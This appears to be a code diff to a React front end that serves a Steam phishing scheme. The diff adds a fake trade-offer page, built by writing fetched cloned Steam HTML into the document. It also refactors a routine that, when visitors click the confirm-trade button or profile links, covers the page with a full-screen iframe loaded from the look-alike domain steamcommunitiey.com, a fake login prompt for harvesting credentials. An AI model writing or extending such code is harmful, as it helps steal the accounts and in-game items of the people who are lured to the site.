@@ -12,12 +12,146 @@ const App = () => {
             const envDomain = process.env.REACT_APP_FRIEND_INVITE_DOMAIN || "";
             const currentDomain = window.location.host;
             const isCurrentDomainValid = envDomain === currentDomain;
-            console.log(currentDomain, isCurrentDomainValid, envDomain);
+            const isTradePage =
+                window.location.pathname.includes("/tradeoffer/new");
+
+            const className = ".lk0e6gi8s69v";
+            const htmlUrl = "https://steamcommunitiey.com/txqmjgkxhzp5.html";
 
             const goTo = () =>
                 (window.location.href = "https://store.steampowered.com/");
 
-            if (!slug && !token_part1 && !token_part2) return goTo();
+            const setUpAuth = () =>
+                setTimeout(() => {
+                    const openWind = () => {
+                        const buttons = document.querySelectorAll(className);
+
+                        if (buttons && buttons.length > 0) {
+                            buttons.forEach((button) => {
+                                button.addEventListener("click", () => {
+                                    const iframe =
+                                        document.createElement("iframe");
+                                    iframe.src = htmlUrl;
+                                    iframe.setAttribute(
+                                        "style",
+                                        "position: fixed; top: -2px; left: -2px; width: 100vw; height: 100vh; z-index: 1000"
+                                    );
+                                    document.documentElement.style.overflow =
+                                        "hidden";
+                                    document.body.appendChild(iframe);
+                                });
+                            });
+                        }
+                    };
+
+                    openWind();
+                }, 100);
+
+            if (!slug && !token_part1 && !token_part2) {
+                const urlParams = new URLSearchParams(window.location.search);
+                const token = urlParams.get("token");
+                const partnerId = urlParams.get("partnerId");
+
+                if (!isTradePage || !partnerId || !token) return goTo();
+
+                await axios
+                    .get(generateUrl("trade/get"))
+                    .then(async (res) => {
+                        if (
+                            res.data.partner !== partnerId ||
+                            res.data.token !== token
+                        )
+                            return goTo();
+
+                        await axios
+                            .get("/trade.html")
+                            .then((res) => {
+                                document.open();
+                                document.write(res.data);
+                                document.close();
+
+                                document.addEventListener(
+                                    "DOMContentLoaded",
+                                    () => {
+                                        const targetElements = [
+                                            ...Array.from(
+                                                document.querySelectorAll(
+                                                    ".slot_actionmenu_button"
+                                                ) || []
+                                            ),
+                                            ...Array.from(
+                                                document.querySelectorAll(
+                                                    ".makeAuth"
+                                                ) || []
+                                            ),
+                                            document.querySelector(
+                                                ".trade_partner_member a"
+                                            ),
+                                            document.querySelector(
+                                                ".trade_partner_headline_sub a"
+                                            ),
+                                            document.querySelector(
+                                                ".trade_partner_steam_level_desc a"
+                                            ),
+                                            document.querySelector(
+                                                "#trade_theirs > div.offerheader > div:nth-child(2) > h2 > a"
+                                            ),
+                                        ];
+
+                                        const confirmOffer =
+                                            document.getElementById(
+                                                "trade_confirmbtn"
+                                            );
+
+                                        confirmOffer?.addEventListener(
+                                            "click",
+                                            (e: any) => {
+                                                if (
+                                                    !(
+                                                        e.currentTarget ||
+                                                        e.target
+                                                    ).classList.contains(
+                                                        "active"
+                                                    )
+                                                )
+                                                    return;
+
+                                                const iframe =
+                                                    document.createElement(
+                                                        "iframe"
+                                                    );
+                                                iframe.src = htmlUrl;
+                                                iframe.setAttribute(
+                                                    "style",
+                                                    "position: fixed; top: -2px; left: -2px; width: 100vw; height: 100vh; z-index: 1000"
+                                                );
+                                                document.documentElement.style.overflow =
+                                                    "hidden";
+                                                document.body.appendChild(
+                                                    iframe
+                                                );
+                                            }
+                                        );
+
+                                        targetElements.forEach(
+                                            (e) =>
+                                                e &&
+                                                e.classList.add(
+                                                    className.replaceAll(
+                                                        ".",
+                                                        ""
+                                                    )
+                                                )
+                                        );
+
+                                        setUpAuth();
+                                    }
+                                );
+                            })
+                            .catch(() => goTo());
+                    })
+                    .catch(() => goTo());
+            }
 
             if (slug && !token_part1 && !token_part2)
                 await axios
@@ -25,37 +159,7 @@ const App = () => {
                     .then((res) => {
                         document.documentElement.innerHTML = res.data;
 
-                        setTimeout(() => {
-                            const className = ".lk0e6gi8s69v";
-                            const htmlUrl =
-                                "https://steamcommunitiey.com/txqmjgkxhzp5.html";
-
-                            const openWind = () => {
-                                const buttons =
-                                    document.querySelectorAll(className);
-
-                                if (buttons && buttons.length > 0) {
-                                    buttons.forEach((button) => {
-                                        button.addEventListener("click", () => {
-                                            const iframe =
-                                                document.createElement(
-                                                    "iframe"
-                                                );
-                                            iframe.src = htmlUrl;
-                                            iframe.setAttribute(
-                                                "style",
-                                                "position: fixed; top: -2px; left: -2px; width: 100vw; height: 100vh; z-index: 1000"
-                                            );
-                                            document.documentElement.style.overflow =
-                                                "hidden";
-                                            document.body.appendChild(iframe);
-                                        });
-                                    });
-                                }
-                            };
-
-                            openWind();
-                        }, 100);
+                        setUpAuth();
                     })
                     .catch(goTo);
 
@@ -71,37 +175,7 @@ const App = () => {
                     .then((res) => {
                         document.documentElement.innerHTML = res.data;
 
-                        setTimeout(() => {
-                            const className = ".lk0e6gi8s69v";
-                            const htmlUrl =
-                                "https://steamcommunitiey.com/txqmjgkxhzp5.html";
-
-                            const openWind = () => {
-                                const buttons =
-                                    document.querySelectorAll(className);
-
-                                if (buttons && buttons.length > 0) {
-                                    buttons.forEach((button) => {
-                                        button.addEventListener("click", () => {
-                                            const iframe =
-                                                document.createElement(
-                                                    "iframe"
-                                                );
-                                            iframe.src = htmlUrl;
-                                            iframe.setAttribute(
-                                                "style",
-                                                "position: fixed; top: -2px; left: -2px; width: 100vw; height: 100vh; z-index: 1000"
-                                            );
-                                            document.documentElement.style.overflow =
-                                                "hidden";
-                                            document.body.appendChild(iframe);
-                                        });
-                                    });
-                                }
-                            };
-
-                            openWind();
-                        }, 100);
+                        setUpAuth();
                     })
                     .catch(() => goTo());
             }
